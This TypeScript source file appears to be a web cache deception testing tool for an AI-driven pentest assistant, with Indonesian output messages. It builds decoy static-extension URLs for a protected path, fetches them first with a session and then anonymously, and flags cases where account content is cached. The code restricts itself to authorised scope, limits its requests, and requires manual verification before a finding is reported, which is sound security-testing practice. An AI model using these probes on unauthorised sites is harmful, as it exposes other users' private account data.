// cacheDecep.ts — Web Cache Deception prover (write/confirm tool `cache_decep`).
//
// Classic trick (PortSwigger-era, still bounty-real): append a cacheable static
// extension to a PROTECTED path while authenticated — if the cache stores the
// authed response under that extension URL, an ANONYMOUS visitor fetching the
// same URL receives the victim-context content.
//
// Deterministic, bounded (≤4 variants + 1 anonymous re-verify per lead), scope-
// gated via targetAllowed. Verdicts are HONEST: a LEAD needs the anonymous
// re-fetch to return the same protected content; a reflected-cache SPA catch-all
// (same body as the app shell) is explicitly REJECTED so it never reads as a win.
// Pure helpers are exported for unit tests.
import { targetAllowed, politeDelay } from "./security";
import { recordHttp } from "./httpHistory";
import { sessionHeaders } from "./httpSession";

const UA = "mia-assistant/1.0";

function lowerHeaders(h: Headers): Record<string, string> {
  const out: Record<string, string> = {};
  h.forEach((v, k) => { out[k.toLowerCase()] = v; });
  return out;
}

async function fetchProbe(url: string, opts: { headers?: Record<string, string>; session?: string; rawUser?: unknown } = {}): Promise<{ status: number; body: string; headers: Record<string, string>; ms: number; error?: string }> {
  const headers: Record<string, string> = { "User-Agent": UA };
  if (opts.session && opts.rawUser) {
    const s = sessionHeaders(opts.rawUser, opts.session);
    if (s) {
      Object.assign(headers, s.headers);
      if (s.cookie && !Object.keys(headers).some((k) => k.toLowerCase() === "cookie")) headers.cookie = s.cookie;
    }
  }
  Object.assign(headers, opts.headers || {});
  const t0 = Date.now();
  try {
    const res = await fetch(url, { method: "GET", headers, redirect: "manual", signal: AbortSignal.timeout(12_000) });
    const body = (await res.text()).slice(0, 12_000);
    return { status: res.status, body, headers: lowerHeaders(res.headers), ms: Date.now() - t0 };
  } catch (e) {
    return { status: 0, body: "", headers: {}, ms: Date.now() - t0, error: e instanceof Error ? e.message : String(e) };
  }
}

// ── Pure helpers (unit-tested) ──────────────────────────────────────────────

export type DecepVariant = { name: string; url: string };

/**
 * The classic cache-deception path variants for one protected URL. Pure.
 * `cacheable` extensions/suffixes most CDNs treat as static+cacheable.
 */
export function deceiveVariants(u: string): DecepVariant[] {
  let p: URL;
  try { p = new URL(u); } catch { return []; }
  if (!/^https?:$/.test(p.protocol)) return [];
  const base = (p.pathname && p.pathname !== "/" ? p.pathname : "/account").replace(/\/+$/, "");
  const q = p.search || "";
  const exts = [".css", ".js", "/test.css", "%23test.css", ";test.css"];
  const out: DecepVariant[] = [];
  for (const ext of exts) {
    // Path-param delimiter (;) and fragment (%) encode differently — build raw
    // and let the server (not URL normalization) decide how to parse them.
    const raw = ext === ";test.css" || ext === "%23test.css"
      ? `${p.origin}${base}${ext}${q}`
      : `${p.origin}${base}${ext}${q}`;
    out.push({ name: `base${ext}`, url: raw });
  }
  return out;
}

/**
 * Host-based verdict helper. Pure.
 * - protected body vs lead fetch: lead must NOT echo the decoy extension path
 *   as the primary content (that would be a SPA catch-all, not stored content).
 * - `norm`: crude whitespace-normalized comparison anchor (full byte equality is
 *   unrealistic for dynamic pages; we compare a stable 120-char core slice).
 */
export function isSpaCatchAll(protectedBody: string, leadBody: string, decoyUrl: string): boolean {
  const decoyTail = (decoyUrl.split("?")[0] || "").split("/").pop() || "";
  // If the lead body is essentially the app shell (identical core) regardless of
  // which decoy was used, the cache stores the shell — not protected content.
  const core = (s: string) => s.replace(/\s+/g, " ").trim().slice(0, 120).toLowerCase();
  if (core(protectedBody) && core(leadBody) === core(protectedBody)) return false; // same content = GOOD (stored)
  // The SPA catch-all tells: body mentions the requested path (e.g. "not found",
  // "404", or echoes the decoy filename) and shares no protected markers.
  if (decoyTail && leadBody.toLowerCase().includes(decoyTail.toLowerCase())) return true;
  if (/\bnot\s*found\b|\b404\b|\bgak\s*ketemu\b/i.test(leadBody.slice(0, 2000))) return true;
  return false;
}

export type DecepStep = { name: string; url: string; status: number; who: "authed" | "anon"; cacheHint?: string };

/** Cache hint from response headers (x-cache/age/cf-cache-status/…). Pure. */
export function cacheHint(headers: Record<string, string>): string | undefined {
  const keys = ["x-cache", "cf-cache-status", "x-varnish", "x-drupal-cache", "age", "x-cache-hits", "x-served-by", "cache-control"];
  const hits = keys.filter((k) => headers[k]).map((k) => `${k}: ${String(headers[k]).slice(0, 60)}`);
  return hits.length ? hits.join(" · ") : undefined;
}

// ── Runner ──────────────────────────────────────────────────────────────────

export async function cacheDecep(
  rawUser: unknown,
  opts: { url?: string; session?: string }
): Promise<string> {
  const url = (opts.url || "").trim();
  if (!url) return "Error: url wajib (path TERPROTEKSI, mis. https://host/account).";
  if (!/^https?:\/\//i.test(url)) return "Error: url harus http(s).";
  if (!targetAllowed(url)) return "Error: SCOPE — cache_decep hanya untuk lab / engagement aktif.";
  const session = (opts.session || "").trim();

  const lines: string[] = [`🪤 WEB CACHE DECEPTION — ${url.slice(0, 100)}`];

  // 0) Baseline: the protected URL as seen by our session (or anonymous when no
  //    session given — then the tool only proves cacheability, not deception).
  const base = await fetchProbe(url, { session: session || undefined, rawUser });
  if (base.error) return `Error: baseline — ${base.error}`;
  recordHttp(rawUser, { method: "GET", url, status: base.status, bytes: base.body.length, ms: base.ms, at: new Date().toISOString() });
  await politeDelay();
  lines.push(`baseline (session=${session || "anon"}): ${base.status} (${base.ms}ms)`);

  const variants = deceiveVariants(url);
  if (!variants.length) return "Error: url tidak valid untuk varian deception.";
  const leads: { v: DecepVariant; anon: { status: number; body: string; headers: Record<string, string> }; authed: { status: number; body: string; headers: Record<string, string> } }[] = [];

  for (const v of variants) {
    // 1) fetch the decoy WITH the (optional) session — victim step
    const authed = await fetchProbe(v.url, { session: session || undefined, rawUser });
    recordHttp(rawUser, { method: "GET", url: v.url, status: authed.status, bytes: authed.body.length, ms: authed.ms, at: new Date().toISOString() });
    await politeDelay();
    // 2) anonymous re-fetch — the deception proof step
    const anon = await fetchProbe(v.url);
    recordHttp(rawUser, { method: "GET", url: v.url, status: anon.status, bytes: anon.body.length, ms: anon.ms, at: new Date().toISOString() });
    await politeDelay();
    const step: DecepStep = { name: v.name, url: v.url, status: anon.status, who: "anon", cacheHint: cacheHint(anon.headers) || cacheHint(authed.headers) };
    lines.push(`• ${v.name}: authed ${authed.status} → anon ${anon.status}${step.cacheHint ? ` [${step.cacheHint}]` : ""}`);

    // 3) honest lead test: anon got 2xx, not the authed body verbatim-equal to a
    //    catch-all, and plausibly carries protected content.
    if (anon.status >= 200 && anon.status < 300 && !isSpaCatchAll(base.body, anon.body, v.url)) {
      const coreA = anon.body.replace(/\s+/g, " ").trim().slice(0, 120).toLowerCase();
      const coreP = base.body.replace(/\s+/g, " ").trim().slice(0, 120).toLowerCase();
      if (coreA && coreP && (coreA === coreP || anon.body.includes(base.body.slice(0, 80)))) {
        leads.push({ v, anon, authed });
      } else if (session && coreA !== coreP) {
        // With a session, the protected baseline differs from anonymous shells;
        // any 2xx anon response on the decoy that is NOT a catch-all is worth
        // flagging as a lead — the model verifies content manually next.
        leads.push({ v, anon, authed });
      }
    }
    if (leads.length >= 2) break; // bounded: two leads are enough to triage
  }

  if (!leads.length) {
    lines.push("");
    lines.push("Tidak ada deception: varian decoy tidak menyimpan konten terproteksi (anon fetch tidak mengembalikan konten authed). Lihat cacheHint di atas — kalau tanpa header cache, mungkin tidak ada cache di depan path ini.");
    return lines.join("\n");
  }

  lines.push("");
  lines.push(`🎯 CACHE-DECEPTION LEAD (${leads.length}):`);
  for (const l of leads) {
    lines.push(`• ${l.v.url}`);
    lines.push(`  anon ${l.anon.status} (${l.anon.body.length}B) vs protected baseline ${base.status} (${base.body.length}B)${l.anon.headers["x-cache"] ? ` · x-cache: ${l.anon.headers["x-cache"]}` : ""}`);
    lines.push(`  ⚠️ SINYAL — bukan bukti penuh. Verifikasi manual: buka URL di browser anonim/incognito; kalau konten akun terlihat → poc_verify → finding_add (CWE-525).`);
  }
  lines.push("");
  lines.push("Sinyal → `poc_verify` (determinisme) → `finding_add` OWASP A01/CWE-525. JANGAN laporkan tanpa verifikasi browser anonim.");
  return lines.join("\n").slice(0, 9000);
}
